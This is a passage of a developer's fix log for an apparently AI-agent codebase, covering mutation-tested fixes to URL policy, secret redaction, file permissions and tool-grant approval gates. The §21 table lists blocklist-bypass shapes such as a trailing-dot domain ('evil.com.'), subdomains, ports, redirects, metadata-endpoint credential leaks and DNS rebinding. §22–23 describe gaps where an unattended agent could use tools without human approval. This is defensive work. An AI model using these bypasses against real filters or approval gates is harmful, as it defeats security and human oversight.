a fix already applied as a mutation and verified green, and neither needed a design decision
first. The three remaining S1s do — #57 (parameter bounds vs a watchdog at `dispatch`), #76 (a
shape-validation layer across eight passes), #100 (a control that could not be made green,
because the chat tests supply their lines by patching `builtins.input`).

| Change | Issue | Files |
|---|---|---|
| Count the retry ROUND, not the revision; scope the in-loop re-tiering to the batch | #74 | `core/reasoning/orchestrator.py`, `core/reasoning/confidence_scoring.py` |
| Make the pinned span whole — a pinned `tool_use` brings back the row that answers it | #88 | `storage.py`, `tests/conftest.py` |

Suite 1576 → **1605**. (The intervening count was 1597; three documents quote it, and
`test_docs_consistency` is what makes that mechanical.)

### #74 — the loop's only bound was data the model supplies

`retry_count` was incremented only inside the loop over Pass 6a's response, so a flagged claim
6a did not **name** could never reach D2's cap — and `while flagged:` had no other bound. 6a is
one batched call across every flagged claim, which is exactly the shape a model drops an item
from, and an omission, an empty list and an unknown id are indistinguishable at that lookup:
the claim resolves to `None` and the `if claim:` skips in silence.

Counting the round makes the cap bound the loop by construction. Because `flagged` only ever
shrinks, every claim still in it exhausts on the same round — which is also what makes the
issue's second defect unreachable through the loop.

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Move the increment back inside `for rev in revisions:` | `test_a_claim_pass_6a_omits_still_exhausts_its_retries` + `test_a_pass_6a_response_naming_nothing_still_exhausts_the_loop` | The bound becomes the model's cooperation again: two model calls per round, each on `RESEARCH_PASS_TOKEN_BUDGET`, with no ceiling but a rate limit |
| **Add** the per-round increment while leaving the per-revision one | `test_pipeline_6a6c_retry_loop_continues_until_max_retries_then_fallback` | A named claim then counts twice and exhausts in half the rounds. This is the issue's own withdrawn control — its red was the mutation's arithmetic, not the fix's cost |
| Drop `claims=flagged` from the in-loop `run_confidence_tiering` | `test_a_retry_round_does_not_re_tier_a_claim_outside_its_batch` | A claim finished at D1 or D2 is recomputed from unchanged score data while the annotation `_apply_fallback` wrote stays — so it ships as (say) LOW beside a note saying it could not be verified. Pass 6b leaves both alone, because `if claim.annotation is None` is false |
| Resolve 6a's revisions with `run.claim_by_id` instead of within `flagged` | Nothing today | A revision naming a claim outside the batch lands on one already finished, carrying a `retry_count` this round did not increment — so the `retry` event reports a stale attempt. Recorded rather than pinned: no canned payload produces it, and validating that a pass answered about what it was asked is #76 |

**The three new tests are bounded by the mock, deliberately.** With the fix reverted the loop
does not fail, it never terminates — so each payload supplies exactly `MAX_PIPELINE_RETRIES`
rounds and `_build_pass_mock` raises when the loop asks for one more. The pipeline's `except`
re-raises, so the red arrives as a failure rather than as a hung suite. The tracker's rule: a
probe that would hang is worth writing, one that hangs is not.

### #88 — the derived view has two span boundaries and only one is turn-aligned

M4 is stated over the checkpoint watermark. The **pinned set** is the other boundary, and it can
never be turn-aligned: `pin` is dispatched from inside a turn, D20 has already persisted the
assistant message carrying the `tool_use` for `pin` itself, and the answering `tool` row is
written after dispatch returns — so it is never pinned. While the pin is in the uncompacted tail
this is invisible. The first compaction whose watermark passes the pinned region puts an
unanswered `tool_use` in the view: an HTTP 400 on Anthropic, durable (the checkpoint is a
persisted row, there is no unpin, and nothing removes a checkpoint), and misattributed — the
user sees a provider error with no visible connection to a `pin` several turns earlier.

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Revert `storage.pinned_through` to returning the pinned rows alone | `test_a_pinned_tool_call_brings_back_the_result_that_answers_it` + `test_a_pinned_pin_call_leaves_no_unanswered_tool_use_in_the_view` | The thread becomes permanently unsendable, and every later call and every resume rebuilds the same view |
| Revert **only** `FakeStorage.pinned_through` | `test_a_pinned_tool_call_comes_back_with_the_result_that_answers_it` | #123's shape, closed rather than repeated: the fake's mirror is now load-bearing, not merely documented as one |
| Re-add every unpinned tool row in the span rather than the needed ones | that test + the two pre-existing M9 tests | Puts back the results compaction just summarized, which is the context the feature exists to shrink |
| Fix it in `_derived_view` or in `pin_last` instead | Nothing — a design note | Consumer-side is this project's canonical bug shape and would hide from the model a call it made; stopping `pin_last` at the last complete turn changes what "pin the last N turns" means and leaves any other non-turn-aligned pinned set open |

**The end-to-end test needs a REAL compaction**, which is why it is in `test_storage_e2e.py`:
the two boundaries coincide until a checkpoint exists. Same reason that file had to exist for
M11. It asserts its preconditions beside the claim — that a fold happened, that the watermark
passed the pinned turn, and that the pinned assistant row is in the view — because without the
last one the real assertion holds vacuously.

### Standing: three backstops in `pinned_through` survive, and the code now says so

`have`, the `set()` dedupe and the `role == "tool"` filter were each deleted separately against
the full suite and **each survived**. What actually keeps the result duplicate-free is the
`not m["pinned"]` filter — a pinned tool row is already in `keep` and cannot be re-added — and
reaching any of the three needs two rows sharing one `tool_call_id`, or a non-tool row carrying
one. Neither has a producer: `add_tool_result` writes exactly one row per call, and
`add_user_message` passes no `tool_call_id`.

Kept rather than trimmed, because what they guard is a *duplicate* `tool_result` — the same wire
error from the other direction as the one the function exists to prevent, which is the wrong
place to trade a free backstop for a reachability argument. The measurement is recorded in the
code so no later reader has to re-derive it, which is the difference between this and the
comments unit 10 and unit 12 had to re-measure.

Two of the new tests were then named for what they discriminate rather than for the guard they
appear to sit on: `test_an_already_pinned_tool_result_is_not_added_twice` stays green with
`have` deleted. That is #61's shape — a test observing an effect adjacent to its cause — caught
before filing rather than after.

### Why the M9 test could not see this

`test_a_pinned_row_inside_the_covered_span_comes_back_verbatim` pins `rows[1]`, an assistant row
whose `tool_calls` is `[]`. **The one thing a pinned assistant row carries in production is the
one thing that fixture leaves empty**, because `pin` is itself a tool. Removing the re-inclusion
entirely *was* pinned; what had no test was the interaction between the two boundaries — and
neither M4 nor M9 mentions the other.

---

## §20 — the fourth fix batch: the docs-drift tier (2026-08-17)

Seventeen issues. Almost all of it is prose, and the one sentence that explains the whole
batch is unit 16's: **the claims that drift are the ones somebody had to count by hand.**

So this batch corrects the current round *and* mechanises four of the counting habits that
produced it. `TECHNICAL_DEBT.md` item 7 pre-registered exactly that trigger — "BUILT markers
and tree entries are still by hand… **if those two start drifting the same way, extend this
file's check**" — and both had drifted.

Suite 1605 → **1613**.

### Standing: moving a dependency out of `requirements.txt` can break a test that never uses it

**This batch broke CI and the local suite stayed green.** Moving `markitdown` to an optional
extra was the point of #144's third item — its only consumer is `file_ops._read_rich`, behind
`read`, which is globally denied and cannot be re-enabled at runtime, and the import is lazy.
Nothing in production can reach it.

But `tests/test_file_ops.py` does `patch("markitdown.MarkItDown", ...)`, and **`mock.patch`
with a string target IMPORTS the module to resolve it.** So the test needed the package
installed for a reason unrelated to anything it asserts: it substitutes a `MagicMock` and never
touches the real library. On a developer machine markitdown was still installed from before, so
the suite passed; on a runner doing a fresh `pip install -r requirements.txt` it failed with
`ModuleNotFoundError`, and it was the ONLY failure — the job reported nothing but `exit code 1`.

Two rules out of it:

1. **When a package leaves `requirements.txt`, grep the suite for its name — including string
   patch targets**, which no import-graph check will find.
2. **A green local suite does not mean a green fresh install.** Reproduced with
   `docker run python:3.11-slim` over a `git archive` of HEAD: pre-fix **1 failed, exit 1**;
   post-fix **1611 passed, exit 0**. That container is also the only way the eleven tests which
   `skipif` on Windows (symlinks, SIGALRM) get run at all — all eleven pass on Linux.

The fix is a stub in the root `conftest.py` beside the six SDK fakes, which is what that
mechanism exists for. Its `convert` RAISES rather than returning something plausible, so
anything reaching it unpatched fails loudly instead of receiving a fake conversion. `_read_rich`
also now turns the missing extra into a message naming `pip install -e ".[documents]"`, since a
bare `ModuleNotFoundError` names a package the user never asked for.

### The four new assertions in `test_docs_consistency.py`

| If a document drifts like this… | …this fails |
|---|---|
| A per-file count in ARCHITECTURE's tree goes wrong | `test_the_tree_states_a_correct_count_for_every_collected_test_file` |
| A test file lands with no tree entry | the same test — **strict** in both directions |
| A tree entry names a file that was renamed away | `test_no_tree_entry_names_a_test_file_that_does_not_exist` |
| A ROADMAP_v2 index entry loses its status marker | `test_every_roadmap_v2_index_entry_carries_a_status_marker` |
| A registered tool never reaches README's approval table | `test_every_registered_tool_appears_in_readmes_approval_table` |
| ARCHITECTURE's registry counts go stale | `test_architecture_states_the_real_registry_counts` |

Seven mutations, all RED on the check named for them. The rule for what belongs in that file
is unchanged and is now written into its docstring: **a claim earns a check by having already
drifted, and only if the truth is something the suite can compute.** Every one of them
compares a document against a live value — the collected session, the registry, the
permission dataclasses — never against another hand-written number.

### Standing: two of the seven mutations survived the first run, for two different reasons

Both are the vacuity class this file exists for, and both generalise:

1. **A narrowed invocation makes a session-dependent check SKIP, and a skip reads as a
   survivor.** The driver ran `pytest tests/test_docs_consistency.py` — which *is* narrowed,
   so the two checks that need `request.session.items` never executed. TECHNICAL_DEBT 6's own
   note ("one class of vacuity a revert check cannot catch is a test that SKIPS") arriving
   inside a mutation driver. **Mutation-check a session-dependent test against the full
   suite.**
2. **A character window is not a structure.** The README check read
   `readme[start:start + 2000]`, which swallowed the explanatory paragraphs below the table —
   and those name `write_project_doc` in backticks too, so deleting it from the table left
   the check green. It now walks the table rows and stops at the first line that is not one.

### Standing: PowerShell's `Get-Content`/`Set-Content` round-trip corrupts UTF-8

Updating the aggregate count with `(Get-Content $f -Raw) -replace ... | Set-Content -Encoding utf8`
**double-encoded three documents** — PS 5.1 reads a BOM-less UTF-8 file as cp1252, so every
`—` and `§` became mojibake, and a BOM was added. Reversible (`decode utf-8 → encode cp1252`)
because the damage is uniform across a whole-file rewrite, but the lesson is the rule:
**do file rewriting in Python with explicit `encoding="utf-8"`, or with the editor.** This is
the same family as the `2>&1` NativeCommandError note — PowerShell is fine for git and
process control and is a hazard for text.

### The corrections, all re-measured rather than copied

The issue bodies predate batches 2 and 3, and every figure in them had moved:

| | audit said | measured now |
|---|---|---|
| Wrong per-file counts | 11 | **18** (`test_math_tools` 14 → 123 after #52's battery; `test_orchestrator` 11 → 23 after batch 3) |
| Test files with no tree entry | 8 | **7** |
| Test files | 54 / 58 | **65** |
| Registered / advertised tools | 16 / 12 | **22 / 16**, 13 callable headless |
| Tests failing without `providers.json` | 11 across 3 files | **12 across 4** |
| `read_project_doc`'s reach | "the project's own README" | **40 files, ~1.1 MB, depths 0-3** |

### Two behaviour changes

| Change | …this fails if reverted | Why |
|---|---|---|
| Anthropic's streaming branch honours `supports_stream_usage` (#40) | `test_stream_anthropic_d21_raises_on_zero_usage_when_flag_true` | The default provider was outside D21, with the `getattr(..., 0)` default AGENTS.md forbids by name. An SDK field rename would have zeroed the budget silently |
| …and honours it rather than always raising | `test_stream_anthropic_honours_the_flag_rather_than_always_raising` | The flag now means one thing on all three providers. Without this second test, that claim has nothing behind it |
| `config.APICredentials` deleted (#23) | nothing — it was dead | Its comment told the reader to store an env var's *name* as their API key, which is not what `credentials.save_credentials` does with the value |

### `CLAUDE.md` is now `AGENTS.md`

`CLAUDE.md` and `QWEN.md` are pointers to it. QWEN.md was a second,
independently-maintained context file with five claims false about the present code, and its
staleness warning lived in the file its reader does not open. One copy, several filenames —
the same argument this document makes about every other hand-maintained duplicate.

**Consequence:** Claude Code auto-injects `CLAUDE.md`, so it now injects a pointer rather than
84 KB. The context is an explicit read instead of an automatic one.

---

## §21 — the fifth fix batch: the URL and output policy boundary (2026-08-18)

Eight issues. Five of them are one question asked at three depths — **may this URL be
requested** — and they are one batch because fixing any of them alone rewrites the others.
#54's own report says so: *"the two fixes want the same manual-redirect loop, so they are
cheaper done together."*

| Change | Issue | Files |
|---|---|---|
| One normaliser, suffix matching | #48 | `safety/policy_enforcement.py` |
| `is_url_permitted` — scheme + domain + non-public address | #54 | `safety/policy_enforcement.py`, `tools/builtin/web_search.py` |
| Manual redirect loop, checked before every hop; report the URL that answered | #53 | `tools/builtin/fetch_url.py` |
| Scan every key of a tool result, not an allowlist | #47 | `safety/policy_enforcement.py`, `mcp_client/client.py` |
| Redact in the log formatter | #132 | `logging_setup.py`, `tools/registry.py` |
| `providers.json` and the trust store created 0600 | #19 | `credentials.py`, `core/workspace_trust.py` |
| Anthropic capabilities read as attributes | #35 | `core/client.py` |
| Contain every UI-thread persistence call | #104 | `tui/app.py` |

Suite 1613 → **1667**.

### What breaks these

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Drop the trailing-dot strip in `_hostname` | `test_a_trailing_dot_does_not_bypass_either_branch` | `evil.com.` is a legal FQDN naming the same host, and it defeated *both* branches |
| Match exactly instead of by suffix | `test_a_subdomain_of_a_blocked_domain_is_blocked` | One prepended label leaves the blocklist |
| Match by bare string suffix instead of by label | `test_the_suffix_match_is_label_wise_not_string_wise` | `notevil.com` starts being blocked — over-blocking a domain nobody listed |
| Stop stripping the port on the bare-domain branch | `test_a_port_does_not_bypass_the_bare_domain_branch` | The two branches disagree again, which is what made #48 an inconsistency rather than a limitation |
| Remove the `is_global` check | `test_non_public_addresses_are_refused` (8 cases) | The metadata endpoint returns role credentials into model context and the persisted `MessageLog` |
| Check only the first resolved address, or require all of them | `test_any_non_public_answer_refuses_not_just_the_first` | A name answering with one public and one private address is the rebinding shape; both readings let it through |
| Pass `resolve=True` from `web_search` | `test_filtering_results_issues_no_dns` | A DNS lookup per search hit, ten hits a call, inside ten passes — nothing *fails*, it just gets slow |
| Check only the first hop | `test_a_redirect_to_a_blocked_domain_is_refused` + the real-httpx twin | One 302 walks past the control, and the blocked host has already served its body |
| Report `parsed.url` instead of the final URL | `test_the_reported_url_is_the_one_that_ANSWERED` + its real-httpx twin | Provenance: a redirect silently rewrites what a claim is grounded in, and `output_writer` builds `sources/` from it |
| Reinstate the `_SCANNED_KEYS` allowlist | 3 tests in `TestEveryKeyIsScanned` | `results` is not `result`; the two tools whose content is entirely third-party text go unredacted |
| Redact the result but not the log record | `test_a_secret_in_a_TRACEBACK_does_not_reach_the_file` | Same string, two sinks, one redacted |
| Remove `tui/app.py`'s replay containment | `test_a_replay_failure_while_resuming_does_not_kill_the_tui` | The app dies having just cleared the screen and written "Resumed thread `<uuid>`." |
| Move the memory load below the transcript reset | `test_a_failure_opening_the_thread_leaves_the_session_on_the_old_one` | Ordering *is* the fix there, not the `try` block |
| Leave `_busy` set when a turn fails to start | `test_a_storage_failure_starting_a_turn_does_not_kill_the_tui` | The shell refuses every later turn with "Still working" for a turn that never started |
| Write `providers.json` with a bare `open()` | `test_a_permissive_umask_does_not_widen_it` — **on POSIX only** | See the standing note below |

### Standing: a skip reads as a surviving mutation, and this batch proved it

§20 recorded this one batch ago — *"a narrowed invocation makes a session-dependent check
SKIP, and a skip reads as a survivor"* — and #19 is the same class from the other direction.
Its four mode assertions `skipif` off POSIX, because POSIX mode bits do not exist on Windows
and `os.open`'s mode only sets the read-only flag there.

**On the development machine, mutating `0o600` to `0o644` left the suite green.** The
mutation was only measurable in `python:3.11-slim`, where all four run:

```
control                                    9 passed
_SECRET_FILE_MODE = 0o644                  2 failed   (420 != 384)
bare open(path, "w")                       2 failed   (438 != 384)
trust store bare open()                    1 failed
```

**The rule: a guard whose test can skip is not verified until the mutation runs where the
test does.** The container is part of this batch's verification, not a formality.

### Standing: the mutation harness is itself a place a mutation can silently not apply

Two mutations in this batch reported a result that was not the result.

1. **A `\n` needle against a CRLF file matches nothing**, and a no-op edit reads as a
   survivor. `tui/app.py` is CRLF while most of the tree is LF. The harness now normalises
   the needle to the file's own line ending and asserts the bytes changed before running
   anything.
2. **A syntactically invalid mutation reports RED for the wrong reason.** Replacing `try:`
   with `if True:` left a dangling `except`, so pytest reported a *collection error* — and
   "1 error" in a summary reads like a kill. The replay guard is now mutated by removing the
   whole block, with `py_compile` run first, so a red is a real failure.

Both are instances of the rule this document already states: **a test that fails for the
wrong reason is indistinguishable from one that works** — arriving, twice, inside the tool
built to enforce it.

### Recorded, not closed: three limitations the tests cannot see

- **DNS rebinding.** `is_url_permitted` resolves, then httpx resolves again independently.
  Closing it means connecting to the pinned IP with the host in a `Host:` header, which on
  HTTPS fights SNI and certificate verification — a subtly wrong implementation there is a
  worse hole than this one. Stated in the function's docstring.
- **`os.open`-with-mode versus `open()`-then-`chmod`.** Mutating the fix to the second form
  stays **green**, and it should: the file ends up 0600 either way. What `os.open` buys is
  the absence of a window in which the key is on disk world-readable, and no offline test can
  observe a race. Measured and recorded so the next reader does not delete the `os.open` as
  ceremony.
- **A pre-existing 0644 file keeps its mode** through `O_TRUNC`. Repairing one is a
  migration; the scope here is "new writes are safe". Pinned by a test that says so.

### Why eight green tests could not see #35

`test_client_effort.py` built its doubles as nested dicts — `capabilities={"effort":
{"high": {"supported": True}}}` — the same wrong shape `core/client.py` assumed. Production
and the double agreed with each other and both disagreed with the SDK, so the capability
query **could never succeed in production and could never fail in the suite**.

Fixing only the code would have left that intact. The doubles are rebuilt attribute-shaped,
and `test_sdk_conformance.py` gained a test driving `_effort_levels` against capability
objects built from the **real pinned types** — the test the dict-shaped doubles could not be.
The general rule, which this project already states about `FakeStorage`: **anything a test
doubles, something has to check against the real thing.**

### The two strict xfails are gone

Both said, in their own reasons, that fixing the issue would turn them XPASS and that the
marker should then be deleted. Both did.

- `test_a_redirect_to_a_blocked_domain_is_refused` (#53) — now a real test, joined by a twin
  driving **real httpx** through a `MockTransport`. The fake httpx is this project's model of
  httpx, and #53 exists because the old code's model of httpx was wrong; a fake written to
  match the new code cannot be evidence that the new code matches httpx.
- `test_the_anthropic_capability_read_matches_the_pinned_types` (#35) — **inverted** rather
  than deleted. It now asserts the chain the fixed code relies on.

`tests/conftest.py`'s `http` driver gained `redirect()` and lost `redirected()`: the old
helper queued the answer a *followed* redirect produces, which is a shape `fetch_url` no
longer receives. A fixture that can only express the old shape quietly stops testing the code
under test. The root `conftest.py`'s fake `_Response` gained `is_redirect` and `next_request`,
both mirroring real httpx's documented rule rather than a rule invented here.

---

## §22 — the sixth fix batch: one grant policy, declared per tool (2026-08-18)

Three issues, two of them S2 security. #67 and #133 are one defect stated twice: **two
functions answer "what may be pre-granted to a call that has not happened yet", and they
disagree.** #106 is not a third choice — fixing #133 promotes it from config-dependent to
certain, so leaving it out would ship a new bug in place of an old one.

| Change | Issue | Files |
|---|---|---|
| `ToolSpec.grant_policy` + `assert_grant_policy_declared` | #133 | `tools/base.py`, `tools/registry.py`, `mcp_client/registration.py` |
| Both grant paths read one declaration; `PIPELINE_UNGRANTABLE` deleted | #67, #133 | `core/reasoning/authorization.py`, `agents/manager.py` |
| A grant by name does not answer a subject-carrying question | #67 | `tools/context.py` |
| The attended provider survives an empty grant set; one shared message | #106 | `tui/app.py`, `main.py` |

Suite 1652 → **1667**.

### What breaks these

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| `write_project_doc` → `GRANT_ANYWHERE` | `test_write_project_doc_is_offered_to_a_human_but_not_to_the_pipeline` | The whole `--grant` menu becomes the one built-in that overwrites files in your repo, including the project hub, which is injected into every opted-in agent |
| `spawn_subagent` or `remember` → `GRANT_ANYWHERE` | `test_spawn_subagent_is_never_offered`, `test_remember_cannot_be_granted_to_a_research_run` | R4 and M17, and #67's point is that neither argument was ever pipeline-specific |
| The pipeline filter loosened to `!= GRANT_NEVER` | 6 tests in `TestCandidates` | The pipeline stops being strictly stricter, which is the only thing the three-valued policy exists to express |
| `candidate_approvals`' policy filter deleted | `test_remember_is_not_offered_to_a_subagent_signoff_either` | The §18 sign-off goes back to offering the two tools R4's own argument is about |
| Undeclared non-MCP resolves to `GRANT_ANYWHERE` | `test_an_undeclared_anything_else_resolves_to_NEVER` | Fails open — the denylist shape this batch exists to remove |
| Undeclared `mcp__*` resolves to `GRANT_NEVER` | `test_an_undeclared_mcp_tool_resolves_to_ANYWHERE` + the picker tests | MCP tools *are* the population both grant paths serve; closing them empties the feature |
| `assert_grant_policy_declared` stops checking the VALUE | `test_a_MISSPELLED_policy_is_refused_too` | An unrecognised string is not `None`, so a presence-only check passes it and the tool silently leaves both paths while looking answered |
| Drop `subject is None` from `recall_signoff` | `test_a_named_grant_does_not_cover_a_subject_carrying_call` | J8's pre-fix behaviour, reached through the grant rather than the memo: one tick lets the child spawn any agent |
| Delete the `granted_tools` branch entirely | 8 tests across `TestTheLoopEnforcesGrantability` / `TestGrantBudget` | The other side of R14 — the §25 grant mechanism must keep working for every tool that has no subject |
| TUI passes `None` when nothing is grantable | `test_attended_survives_grant_when_nothing_can_be_granted` | `--grant` silently turns `--attended` **off**, and the run proceeds looking supervised |
| TUI manufactures a bundle when attended is off | `test_grant_alone_with_nothing_grantable_still_authorises_nothing` | The fix overshooting the other way, handing the pipeline a provider nobody asked for |
| Either shell writes its own empty-answer message | `test_both_shells_say_the_same_thing_about_an_empty_answer` | They already drifted once, and the TUI's version was *false*: "no gated tool is available" when two were |

### Behaviour change: `--grant` offers nothing on a default install

`candidates()` now returns `[]` on a fresh clone. This is correct rather than a regression,
and it is worth stating plainly because it looks like a feature going dark:

```
candidates(), default install       : []
candidates(), one MCP tool connected: ['mcp__demo__post_message']
```

Every built-in is now ungated, param-dependent, or excluded by policy. The population both
grant paths serve is **MCP tools** — allowed but approval-gated by default (§17 decision D),
carrying no `approval_check`, named at connection time. R1's argument that a tool's own
description *"is the whole of informed consent here, because MCP exposes no read-only/write
metadata"* was written about exactly them, and `README.md`'s `--grant-tools` example was
already `mcp__files__search`.

### Standing: a fix that shrinks a set makes every negative about it a tautology

This is a new entry in the vacuity catalogue, and it arrived from the *fix* rather than from
the code under test. Excluding `write_project_doc` emptied `candidates()`, and

```python
assert "remember" not in [name for name, _ in authorization.candidates()]
```

in `test_remember_tool.py` — which has no fixture — becomes `"remember" not in []`, true of
every string ever written. It would have stayed green forever.

Sweeping for the class found one that **predates this batch**:
`test_candidate_approvals_omits_tools_the_grant_cannot_cover` patches `ToolPermissions` and
`ToolApprovals` down to a single `shell` field, which leaves every other built-in ungated —
so `candidate_approvals()` was already empty there and `"shell" not in []` had never
discriminated anything.

Both now prove the exclusion by **subtraction from a populated set**, and
`test_the_offered_set_is_not_empty` guards the rest of `TestCandidates` so a later change
cannot quietly empty it and leave the file green. **The rule: whenever a change makes a set
smaller, re-check every negative assertion about it. Green is not evidence they still
discriminate.**

### Recorded, not closed: the import assert's call site survives its mutation

Deleting `assert_grant_policy_declared(registry._tools, registry._tools)` leaves the suite
green. That is expected, and the project has already said so once — `test_pin_tool.py`'s
D24 test notes that *"this passing at all is partly the import succeeding"*. The claim was
**measured rather than assumed**, by mutating the guard and the mistake together:

```
control (untouched)                   GREEN: 51 passed
assert deleted only                   GREEN: 51 passed        <- the survivor
undeclared tool, assert INTACT        RED:   1 error   (RuntimeError at import)
undeclared tool AND assert deleted    RED:   1 failed  (test_every_registered_tool_declares_one)
```

So the mistake the assert guards against — registering a tool with no declaration — is
caught **either way**. `test_every_registered_tool_declares_one` scans the live registry, so
the state is pinned independently of the call site. What the call adds is *when* the failure
surfaces: a `RuntimeError` at import, before anything runs, rather than one named test
failing later. No in-process test can observe that difference, which is why the mutation
survives and why deleting the call as ceremony would still be wrong.

Note the third row is itself the hazard §21 recorded: it reports as **"1 error"**, the shape
that reads like a kill and usually is not. Here the error *is* the intended behaviour, which
is the same ambiguity from the other side.

### Two callers, and why the test asserts the RELATION

The defect was that the two sets *disagreed*, so a test checking each one separately passes
against a version where they drift apart again — which is precisely how this shipped, since
both sets had tests and both were green.

```
pipeline ⊆ sign-off, and {grant_policy(t) for t in sign-off − pipeline} ⊆ {GRANT_SIGNOFF_ONLY}
```

The subset direction is the security claim (the unattended path can never offer more than
the attended one) and the second clause is what stops the subset from being satisfied by
accident — an empty pipeline set makes `⊆` trivially true, so the test asserts non-emptiness
first.

### Superseded rows above

§25's row *"Remove `PIPELINE_UNGRANTABLE` / add `spawn_subagent` back"* and §21b's *"Remove
`remember` from `PIPELINE_UNGRANTABLE`"* name a constant that no longer exists. The
decisions they record still hold — the arguments moved to the registrations, unchanged, and
the rows in this section replace them. Kept rather than edited, per this file's convention:
what a past batch measured is not rewritten by a later one.


## §23 — the seventh fix batch: a grant the model can actually see (2026-08-18)

Three issues, one mechanism: **what `schemas(callable_only=…)` advertises to a run that
cannot ask.** #156 is the substantive one and it is §25's own founding defect, still
standing on the path §25 was written for.

| Change | Issue | Files |
|---|---|---|
| The advertisement filter reads the grant (`_answered_by_grant`) | #156 | `tools/registry.py` |
| `run_info` moves above the schemas call; the grant is passed | #156 | `core/loop.py` |
| A headless denial says whether the ARGUMENTS caused it | #158 | `core/loop.py` |
| "A headless run cannot spawn at all" is tested, not emergent | #159 | `tests/test_agents.py` |

Suite 1684 -> **1698**.

### The measurement, before and after

Through the real `run_deep_research_mode`, capturing the `tools` argument that reaches
`call_model_stream` -- not a dispatch outcome, for the reason in the vacuity note below:

```
                            BEFORE                 AFTER
--grant-tools X             False  (13 tools)      True   (14 tools)
--grant-tools X --attended  True   (17 tools)      True   (17 tools)
no flags                    False  (13 tools)      False  (13 tools)
```

A grant-only run sent the model **byte-identical tools to an unflagged run**, while the CLI
printed `[grant] authorised for this run only: mcp__demo__post`. Enforcement was correct
throughout; the model was never told the tool existed.

### What breaks these

| If production code changes like this... | ...this fails | Why it matters |
|---|---|---|
| `granted=` dropped at the `schemas()` call site | `test_a_granted_tool_is_advertised_with_no_channel` | This IS #156: `--grant-tools` silently does nothing on its own while reporting success |
| `grantable()` re-check deleted from `_answered_by_grant` | `test_a_grant_naming_a_param_dependent_tool_advertises_nothing` | R2 at the filter -- a stale grant naming `shell` would advertise it |
| The `grant_policy` check deleted from `_answered_by_grant` | `test_a_grant_cannot_smuggle_spawn_subagent_into_a_headless_run` | `spawn_subagent` has no `approval_check`, so `grantable()` alone lets it through -- and R14 then refuses a tool the model was shown, recreating advertised-and-uncallable one line down |
| `headless_hidden` ignores `granted` | `test_a_granted_tool_is_not_reported_as_hidden` | The WARNING names a tool the model can actually call -- the invisibility problem it exists to prevent, wearing the opposite sign |
| The budget made to retract advertisement | `test_the_budget_does_not_change_what_is_advertised` | R6's fallback is a *call-time* answer; hiding the tool mid-run means the fallback never runs and the model reads it as the tool ceasing to exist |
| `run_info` moved back below `schemas()` | `NameError` across every test that drives `_run` | Build order is load-bearing now, and loudly so |
| Denial always blames the name | `test_a_denial_caused_by_the_arguments_says_so` | The model is told to stop when varying one argument would work |
| Denial always blames the arguments | `test_a_denial_caused_by_the_NAME_tells_the_model_to_stop` | The model retries a tool that is uncallable however it is called, spending the rest of `max_steps` |
| `response_channel is not None` branch removed | `test_a_human_saying_no_is_not_reframed_as_a_limitation` | A person's "no" gets reported as "this run has no way to ask" -- a decision misattributed to the configuration |
| Headless filter loosened to `!= GRANT_NEVER` | `test_a_signoff_only_tool_is_invisible_to_a_headless_run` + the relation test | `write_project_doc` becomes visible to an unattended run, which is the one thing `SIGNOFF_ONLY` was declared to prevent |
| The loop's grant branch stops reading `grant_policy` | `test_a_GRANT_NEVER_tool_in_a_grant_is_still_asked_about` | A grant naming `remember` writes a durable cross-session memory with no prompt (M17's scenario) |
| `answered_by_name = not signoff` instead of `is None` | `test_s1_signoff_is_remembered_per_agent_not_per_tool_name` | An EMPTY sign-off subset is falsy but is a real answer, so truthiness misreads a memo as a name grant and R13 then blocks it |
| `ToolApprovals.spawn_subagent = False` | `test_a_headless_run_is_never_offered_spawn_subagent` | r3-1 recreated through config: a headless pass spawns a child that silently loses every gated tool |

Ten mutations run, nine RED on a test named for each, plus a deliberate GREEN control. The
config mutation was re-checked in isolation because `-x` had it killed by an unrelated test
first: run alone, `test_a_headless_run_is_never_offered_spawn_subagent` fails and its control
`test_a_run_that_can_ask_IS_offered_spawn_subagent` passes, so the mutation is discriminated
rather than merely fatal.

### Found reviewing this batch, before merge

Two places ask a question `grant_policy` answers and neither consulted it. Neither is
reachable — `candidates()`, `candidate_approvals()` and `parse_grant_spec` all refuse the
names involved — so nothing shipped broken. "Unreachable" is a fact about today's callers;
these are claims about the policy, and R14 was added on exactly that argument.

**The headless advertisement filter was written `!= GRANT_NEVER`.** It is reached *only*
when the run is headless, which is the unattended case `GRANT_SIGNOFF_ONLY` exists to
exclude — so the looser test readmitted `write_project_doc` precisely where R13's argument
was written against it, and disagreed with `candidates()`, which answers the same question.
**That is #67/#133's own shape, reappearing inside the batch that generalised it.** Now
`== GRANT_ANYWHERE`, with a test asserting the *relation* to `candidates()` rather than
checking each — the same remedy #67 used, for the same reason.

**The loop's grant branch never read the policy at all** (batch 6's gap, not this batch's).
`spawn_subagent` was covered only because R14's subject condition happens to catch it;
`remember` carries no subject, so a grant naming it dispatched unprompted:

```
before:  granted={'remember'}  prompts=0  dispatched=['remember']
after :  granted={'remember'}  prompts=1  dispatched=['remember']   <- asked, then allowed
```

**The first attempt at that fix broke the sign-off memo**, and only
`test_s1_signoff_is_remembered_per_agent_not_per_tool_name` caught it — a test named for the
memo, not for the policy. Testing `grant_policy` unconditionally stops §23's memo applying,
because `spawn_subagent` is `GRANT_NEVER`, so the same agent is asked about twice in one
turn. **R13 is about what approving a NAME buys; a memo is an answer somebody gave about one
subject, which J8 and R14 govern.** The two enforcement predicates therefore differ on
purpose:

| question | predicate | why |
|---|---|---|
| may a grant make this visible to a **headless** run? | `== GRANT_ANYWHERE` | headless *is* unattended, and `SIGNOFF_ONLY` excludes unattended |
| does a name grant **apply** to this call? | `!= GRANT_NEVER` | a subagent holding a `SIGNOFF_ONLY` tool after a sign-off has a channel and must run it unprompted — that is what the sign-off bought |

The discriminator is `signoff is None`, **not truthiness**: an empty sign-off subset is a
real answer (spawn the agent with nothing granted) and is stored as `set()`, which is falsy.
Both the distinction and the empty-set edge now have tests named for them.

### A test that supplies the model's move cannot detect that the move was unavailable

New vacuity class, and the reason a suite with **23 green grant tests** was evidence of
nothing here. Every loop-level grant test passes a channel *and* builds the model's response
itself:

```python
uses = make_model_response(text="", tool_calls=[
    {"id": f"c{i}", "name": tool_name, "input": {"n": i}} ...
```

The tool call is injected *downstream of the filter that would have hidden it*. Those tests
can observe what the loop does with a chosen tool; they cannot observe whether the tool was
